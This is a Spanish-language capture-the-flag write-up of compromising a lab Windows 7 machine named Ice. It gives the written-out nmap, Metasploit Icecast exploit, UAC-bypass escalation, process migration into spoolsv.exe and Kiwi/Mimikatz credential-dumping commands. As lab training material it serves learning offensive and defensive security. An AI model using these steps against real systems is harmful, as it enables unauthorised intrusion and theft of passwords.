# Ice

Conceptos clave: Metasploit, Icecast Vulnerability, Local Exploit Suggester, Process Migration, Credential Harvesting, Kiwi (Mimikatz), Windows Enumeration
Dificultad: Fácil
Fecha: 17 de junio de 2026

## Resumen
Compromiso de la máquina **Ice** (Windows 7) explotando una vulnerabilidad en el servicio **Icecast**. Se obtuvo acceso inicial mediante Metasploit, seguido de una elevación de privilegios utilizando `local_exploit_suggester`. Finalmente, se realizó una migración de procesos a un servicio con altos privilegios (`spoolsv.exe`) para extraer credenciales en texto plano de la memoria utilizando la extensión Kiwi.

---

## 1. Reconocimiento (Recon)

### 1.1 Escaneo de Puertos y Servicios
Se procedió a identificar la superficie de ataque mediante Nmap:

```bash
nmap -p- --open -sS -n -Pn <IP>
nmap -p 139,445,3389,8000 -sC -sV <IP>
```

**Hallazgos relevantes:**
* `139/tcp` y `445/tcp`: SMB.
* `3389/tcp`: RDP.
* `8000/tcp`: **Icecast streaming media server**.
* **Hostname:** `DARK-PC`.
* **OS:** Windows 7 Professional (Build 7601).

### 1.2 Enumeración Manual
* **SMB:** Se intentó acceso mediante sesión nula (`smbmap -H <IP>`), pero el acceso fue denegado.
* **HTTP (8000):** Se exploró el servicio Icecast por web. Al no presentar una interfaz administrativa obvia, la versión del servicio fue el principal vector de entrada.

---

## 2. Acceso Inicial (Initial Access)

### 2.1 Explotación de Icecast
Sabiendo que Icecast suele ser vulnerable a un *Header Overwrite* (CVE-2004-1561), se optó por la explotación vía Metasploit Framework.

*Nota de aprendizaje: Se intentó realizar la explotación de forma manual compilando un exploit público en C. Debido a incompatibilidades de dependencias por la antigüedad del código (2004), la compilación no fue viable en el entorno actual. Por eficiencia, se pivotó a Metasploit.*

```bash
msfconsole
search icecast
use exploit/windows/http/icecast_header
set RHOSTS <IP>
set LHOST <IP_VPN>
exploit
```

**Resultado:** Sesión de Meterpreter obtenida con los privilegios del usuario `Dark`.

### 2.2 Enumeración del Sistema
Dentro de Meterpreter, se validó la arquitectura y el usuario:
```meterpreter
sysinfo
# Architecture: x64
# Build: Windows 7 (7601)
getuid
# Server username: Dark-PC\Dark
```

---

## 3. Escalada de Privilegios (Privilege Escalation)

Al no tener privilegios de `NT AUTHORITY\SYSTEM`, se utilizó el módulo de sugerencias de exploits locales de Metasploit para automatizar la búsqueda de vectores de escalada.

### 3.1 Local Exploit Suggester
1. Se puso la sesión actual en segundo plano (`background`).
2. Se ejecutó el módulo de reconocimiento:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

El módulo identificó un vector de *bypass* de UAC viable. Se configuró el exploit sugerido apuntando a la sesión inicial y se ejecutó, obteniendo una segunda sesión de Meterpreter, esta vez con contexto administrativo.

---

## 4. Post-Explotación y Credenciales

Para extraer las contraseñas, es necesario tener privilegios de arquitectura coherentes (x64) y estar inyectado en un proceso con altos privilegios de sistema (`SYSTEM`).

### 4.1 Migración de Proceso (Process Migration)
1. Se verificaron los privilegios actuales con `getprivs`.
2. Se listaron los procesos del sistema (`ps`) en busca de un servicio estable que se ejecutara como `NT AUTHORITY\SYSTEM`.
3. Se seleccionó el servicio **Print Spooler** (`spoolsv.exe`).

```meterpreter
migrate -N spoolsv.exe
```

### 4.2 Extracción de Credenciales (Credential Harvesting)
Con el contexto adecuado tras la migración, se cargó la extensión **Kiwi** (una implementación actualizada de Mimikatz para Meterpreter) para realizar un volcado de las credenciales cacheadas en memoria.

```meterpreter
load kiwi
creds_all
```

**Resultado:** Se extrajo con éxito la contraseña en texto plano para el usuario `Dark`, logrando el compromiso total de la máquina y la capacidad de pivotar o mantener persistencia.
